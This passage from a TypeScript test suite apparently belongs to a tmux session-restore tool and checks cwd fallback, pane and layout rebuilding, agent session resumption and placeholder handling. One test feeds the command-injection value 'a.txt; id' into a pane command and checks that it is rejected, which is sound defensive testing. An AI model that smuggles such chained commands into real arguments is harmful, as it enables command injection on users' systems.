    expect(
      buildPaneCommand({ index: 0, active: true, full_command: ["nvim", "a.txt; id"] }),
    ).toBeNull();
  });
});

describe("resolveRestoreCwd & restoreSpace", () => {
  test("resolveRestoreCwd follows cwd -> worktreePath -> mainRepoRoot -> cwd and ignores regular files", () => {
    const mainRoot = makeTempDir("main-repo-");
    const wtRoot = makeTempDir("wt-root-");
    const liveSub = path.join(wtRoot, "sub");
    mkdirSync(liveSub, { recursive: true });
    const fileNotDir = path.join(makeTempDir("file-parent-"), "file.txt");
    writeFileSync(fileNotDir, "x");

    const missingDir = path.join(wtRoot, "missing");
    const missingMain = path.join(mainRoot, "missing-main");

    expect(resolveRestoreCwd("", wtRoot, mainRoot)).toBe("");
    expect(resolveRestoreCwd(liveSub, wtRoot, mainRoot)).toBe(liveSub);
    expect(resolveRestoreCwd(missingDir, wtRoot, mainRoot)).toBe(wtRoot);
    expect(resolveRestoreCwd(missingDir, wtRoot, "")).toBe(wtRoot);
    expect(resolveRestoreCwd(missingDir, fileNotDir, mainRoot)).toBe(mainRoot);
    expect(resolveRestoreCwd(missingDir, "/nonexistent-wt", mainRoot)).toBe(mainRoot);
    expect(resolveRestoreCwd(missingDir, "/nonexistent-wt", missingMain)).toBe(missingDir);
  });

  test("restoreSpace reconstructs multi-window, >2 pane tiled rebalance, zoom, worktree options, and Codex dedup", async () => {
    const driver = new FakeDriver();
    const snap: ResurrectSpaceSnapshot = {
      name: "alpha",
      cwd: "/repo/a",
      worktree_path: "/wt/a",
      worktree_name: "wt-a",
      worktree_base: "main",
      main_repo_root: "/repo/main",
      active_window_index: 2,
      windows: [
        {
          index: 1,
          name: "dev",
          layout: "lay-a",
          active: false,
          zoomed: true,
          width: 160,
          height: 48,
          worktree_path: "/wt/win1",
          worktree_name: "win1-wt",
          worktree_base: "dev",
          panes: [
            { index: 1, cwd: "/repo/a", active: false, agent: "codex", session_id: "cx-1" },
            { index: 2, cwd: "/repo/a/sub", active: true, full_command: ["nvim", "x.ts"] },
            { index: 3, cwd: "/repo/a/dup", active: false, agent: "codex", full_command: ["codex", "resume", "cx-1"] },
          ],
        },
        {
          index: 2,
          name: "shell",
          active: true,
          panes: [{ index: 1, cwd: "/repo/a", active: true }],
        },
      ],
    };

    await restoreSpace(driver, snap, {
      selfPath: "/bin/tmux-spaces",
      switch: true,
      resumePolicy: TEST_RESUME_POLICY,
      isDir: () => true,
    });

    expect(driver.ops).toEqual([
      "new-session-id:alpha:/repo/a:dev:160x48:/bin/tmux-spaces __shim codex codex resume cx-1=@1,%1",
      "set-sess-opt:alpha:@spaces_worktree_path=/wt/a",
      "set-sess-opt:alpha:@spaces_worktree_name=wt-a",
      "set-sess-opt:alpha:@spaces_worktree_base=main",
      "set-win-opt:@1:@spaces_worktree_path=/wt/win1",
      "set-win-opt:@1:@spaces_worktree_name=win1-wt",
      "set-win-opt:@1:@spaces_worktree_base=dev",
      "split-id:%1:/repo/a/sub:nvim x.ts=%2",
      "layout:@1:tiled",
      "split-id:%2:/repo/a/dup:=%3",
      "layout:@1:lay-a",
      "select-pane:%2",
      "zoom:%2",
      "new-window-id:alpha:/repo/a:shell:=@2,%4",
      "select-pane:%4",
      "select-win:@2",
      "switch:alpha",
    ]);
  });

  test("restoreSpace falls back deleted worktree pane CWDs to main_repo_root", async () => {
    const mainRoot = makeTempDir("main-");
    const deletedWt = path.join(makeTempDir("wt-parent-"), "gone-wt");
    const driver = new FakeDriver();

    await restoreSpace(
      driver,
      {
        name: "wt-space",
        cwd: deletedWt,
        worktree_path: deletedWt,
        main_repo_root: mainRoot,
        windows: [],
      },
      { selfPath: "/bin/tmux-spaces" },
    );

    expect(driver.ops).toEqual([
      `new-session:wt-space:${mainRoot}::`,
      `set-sess-opt:wt-space:@spaces_worktree_path=${deletedWt}`,
    ]);
  });

  test("restoreSpace runs Tier 6 VendorSessionLookup and round-trips through SpacesStore", async () => {
    const store = new SpacesStore(":memory:");
    const lookup: VendorSessionLookup = (agent, _cwd, _profile, title, exclude) => {
      if (agent === "claude" && title === "Fix auth" && !exclude.has("s-auth")) {
        return { sessionId: "s-auth", storeAvailable: true };
      }
      return { sessionId: "", storeAvailable: true };
    };

    const snap: ResurrectSpaceSnapshot = {
      name: "tier6",
      cwd: "/repo",
      windows: [
        {
          index: 1,
          name: "agents",
          active: true,
          layout: "main-vertical",
          panes: [
            { index: 1, active: true, agent: "claude", title: "Fix auth", full_command: ["claude"] },
            { index: 2, active: false, agent: "claude", title: "Fresh", full_command: ["claude"] },
            { index: 3, active: false, cwd: "/repo" },
            { index: 4, active: false, cwd: "/repo" },
          ],
        },
      ],
    };
    store.saveResurrectSpace(snap);
    const loaded = store.getResurrectSpace("tier6")!;

    const driver = new FakeDriver();
    await restoreSpace(driver, loaded, {
      selfPath: "/bin/tmux-spaces",
      resolveSession: lookup,
      resumePolicy: TEST_RESUME_POLICY,
      isDir: () => true,
    });

    // 4 panes -> intermediate tiled layout after pane 2 and pane 3, final layout after pane 4
    expect(driver.ops).toEqual([
      "new-session-id:tier6:/repo:agents:0x0:/bin/tmux-spaces __shim claude claude --resume s-auth=@1,%1",
      "split-id:%1:/repo:/bin/tmux-spaces __shim claude claude=%2",
      "layout:@1:tiled",
      "split-id:%2:/repo:=%3",
      "layout:@1:tiled",
      "split-id:%3:/repo:=%4",
      "layout:@1:main-vertical",
      "select-pane:%1",
      "select-win:@1",
    ]);

    store.close();
  });
});

describe("isSingleEmptyShellSession & autoRestore", () => {
  test("isSingleEmptyShellSession detects single untouched shell sessions only", () => {
    expect(
      isSingleEmptyShellSession({
        currentSession: "0",
        currentPaneId: "%0",
        sessions: [makeSession({ name: "0" })],
        windows: [makeWindow({ sessionName: "0", id: "@0", index: 0 })],
        panes: [makePane({ sessionName: "0", windowId: "@0", id: "%0", currentCommand: "-zsh" })],
      }),
    ).toEqual({ isEmpty: true, sessionName: "0" });

    // Non-shell command -> false
    expect(
      isSingleEmptyShellSession({
        currentSession: "0",
        currentPaneId: "%0",
        sessions: [makeSession({ name: "0" })],
        windows: [makeWindow({ sessionName: "0", id: "@0", index: 0 })],
        panes: [makePane({ sessionName: "0", windowId: "@0", id: "%0", currentCommand: "nvim" })],
      }).isEmpty,
    ).toBe(false);

    // Agent pane -> false
    expect(
      isSingleEmptyShellSession({
        currentSession: "0",
        currentPaneId: "%0",
        sessions: [makeSession({ name: "0" })],
        windows: [makeWindow({ sessionName: "0", id: "@0", index: 0 })],
        panes: [
          makePane({
            sessionName: "0",
            windowId: "@0",
            id: "%0",
            currentCommand: "zsh",
            spacesApp: "claude",
          }),
        ],
      }).isEmpty,
    ).toBe(false);
  });

  test("autoRestore restores only openState.spaces, kills '0' placeholder, and enforces @spaces_restored guard", async () => {
    const store = new SpacesStore(":memory:");
    store.saveResurrectSpace({
      name: "alpha",
      cwd: "/repo/a",
      windows: [{ index: 0, name: "dev", active: true, panes: [{ index: 0, cwd: "/repo/a", active: true }] }],
    });
    store.saveResurrectSpace({
      name: "beta",
      cwd: "/repo/b",
      windows: [{ index: 0, name: "shell", active: true, panes: [{ index: 0, cwd: "/repo/b", active: true }] }],
    });
    store.saveResurrectSpace({
      name: "exited-space",
      cwd: "/repo/e",
      windows: [{ index: 0, name: "old", active: true, panes: [{ index: 0, cwd: "/repo/e", active: true }] }],
    });
    store.saveOpenState({
      active_session: "beta",
      spaces: ["alpha", "beta"],
    });

    const driver = new FakeDriver();
    driver.clientsPresent = true;
    driver.snap = {
      currentSession: "0",
      currentPaneId: "%0",
      sessions: [makeSession({ id: "$0", name: "0", attached: 1 })],
      windows: [makeWindow({ sessionName: "0", id: "@0", index: 0, name: "zsh", active: true })],
      panes: [makePane({ sessionName: "0", windowId: "@0", id: "%0", currentCommand: "zsh" })],
    };

    const res = await autoRestore(driver, store, {
      selfPath: "/bin/tmux-spaces",
      isDir: () => true,
    });
    expect(res.restored).toEqual(["alpha", "beta"]);
    expect(res.activeSession).toBe("beta");
    expect(res.removedPlaceholder).toBe(true);
    expect(res.errors).toEqual([]);

    const opsStr = driver.ops.join("\n");
    expect(opsStr).toContain(`set-global-opt:${SPACES_RESTORED_OPTION}=pending`);
    expect(opsStr).toContain(`set-global-opt:${SPACES_RESTORED_OPTION}=done`);
    expect(opsStr).toContain("switch-client:beta");
    expect(opsStr).toContain("kill-session:0");
    expect(opsStr).not.toContain("exited-space");
    expect(driver.globalOptions.get(SPACES_RESTORED_OPTION)).toBe("done");

    // Second invocation sees @spaces_restored === "done" and becomes a no-op
    const opCountBefore = driver.ops.length;
    const second = await autoRestore(driver, store, { selfPath: "/bin/tmux-spaces" });
    expect(second.restored).toEqual([]);
    expect(driver.ops.length).toBe(opCountBefore);

    store.close();
  });

  test("autoRestore renames matching bootstrap placeholder via __spaces_bootstrap_<pid> and preserves custom sessions", async () => {
    const store = new SpacesStore(":memory:");
    store.saveResurrectSpace({
      name: "main",
      cwd: "/repo/main",
      windows: [
        { index: 1, name: "code", active: true, panes: [{ index: 1, cwd: "/repo/main", active: true }] },
        { index: 2, name: "logs", active: false, panes: [{ index: 1, cwd: "/repo/main", active: false }] },
      ],
    });
    store.saveOpenState({ active_session: "main", spaces: ["main"] });

    // Case 1: Matching single empty shell session "main" -> rename aside, restore, switch, kill
    const d1 = new FakeDriver();
    d1.clientsPresent = true;
    d1.snap = {
      currentSession: "main",
      currentPaneId: "%0",
      sessions: [makeSession({ id: "$0", name: "main", attached: 1 })],
      windows: [makeWindow({ sessionName: "main", id: "@0", index: 0, name: "zsh", active: true })],
      panes: [makePane({ sessionName: "main", windowId: "@0", id: "%0", currentCommand: "zsh" })],
    };
    const r1 = await autoRestore(d1, store, {
      selfPath: "/bin/tmux-spaces",
      pid: 4242,
      isDir: () => true,
    });
    expect(r1.restored).toEqual(["main"]);
    expect(r1.removedPlaceholder).toBe(true);
    expect(d1.ops).toContain("rename-session:main->__spaces_bootstrap_4242");
    expect(d1.ops).toContain("kill-session:__spaces_bootstrap_4242");
    expect(d1.ops).toContain("switch-client:main");

    // Case 2: Custom user session "scratch" is NOT touched or killed
    const d2 = new FakeDriver();
    d2.clientsPresent = true;
    d2.snap = {
      currentSession: "scratch",
      currentPaneId: "%0",
      sessions: [makeSession({ id: "$0", name: "scratch", attached: 1 })],
      windows: [makeWindow({ sessionName: "scratch", id: "@0", index: 0, name: "zsh", active: true })],
      panes: [makePane({ sessionName: "scratch", windowId: "@0", id: "%0", currentCommand: "zsh" })],
    };
    const r2 = await autoRestore(d2, store, {
      selfPath: "/bin/tmux-spaces",
      isDir: () => true,
    });
    expect(r2.restored).toEqual(["main"]);
    expect(r2.removedPlaceholder).toBe(false);
    expect(d2.ops.join("\n")).not.toContain("kill-session:scratch");

    // Case 3: When nothing restores after renaming placeholder aside, restore original name
    const storeMissing = new SpacesStore(":memory:");
    storeMissing.saveOpenState({ active_session: "main", spaces: ["main"] });
    const d3 = new FakeDriver();
    d3.snap = d1.snap;
    const r3 = await autoRestore(d3, storeMissing, { pid: 9999 });
    expect(r3.restored).toEqual([]);
    expect(r3.errors).toHaveLength(1);
    expect(d3.ops).toContain("rename-session:main->__spaces_bootstrap_9999");
    expect(d3.ops).toContain("rename-session:__spaces_bootstrap_9999->main");
    expect(d3.globalOptions.get(SPACES_RESTORED_OPTION)).toBe("done");

    // Case 4: Headless server (no attached clients) skips switchClient yet still removes placeholder
    const d4 = new FakeDriver();
    d4.clientsPresent = false;
    d4.snap = {
      currentSession: "0",
      currentPaneId: "%0",
      sessions: [makeSession({ id: "$0", name: "0", attached: 0 })],
      windows: [makeWindow({ sessionName: "0", id: "@0", index: 0, name: "bash", active: true })],
      panes: [makePane({ sessionName: "0", windowId: "@0", id: "%0", currentCommand: "bash" })],
    };
    const r4 = await autoRestore(d4, store, { selfPath: "/bin/tmux-spaces", isDir: () => true });
    expect(r4.restored).toEqual(["main"]);
    expect(r4.removedPlaceholder).toBe(true);
    expect(d4.ops).toContain("kill-session:0");
    expect(d4.ops.join("\n")).not.toContain("switch-client:");

    store.close();
    storeMissing.close();
  });
});
